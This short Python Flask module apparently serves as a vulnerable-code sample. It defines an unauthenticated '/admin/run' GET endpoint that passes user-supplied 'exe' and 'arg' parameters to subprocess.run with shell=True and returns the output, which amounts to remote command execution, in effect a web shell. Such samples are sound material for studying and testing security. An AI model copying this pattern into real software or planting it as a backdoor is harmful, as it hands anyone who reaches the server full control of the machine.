from flask import request
import subprocess

def init(app):

        @app.route('/admin/run', methods=['GET'])
        def admin_run():
                exe = request.args.get("exe", "")
                arg = request.args.get("arg", "")

                if not exe:
                        exe = ""
                if not arg:
                        arg = ""

                program = exe.strip()
                value = arg.strip()

                proc = subprocess.run([program, value], shell=True, capture_output=True, encoding="utf-8")
                return proc.stdout + proc.stderr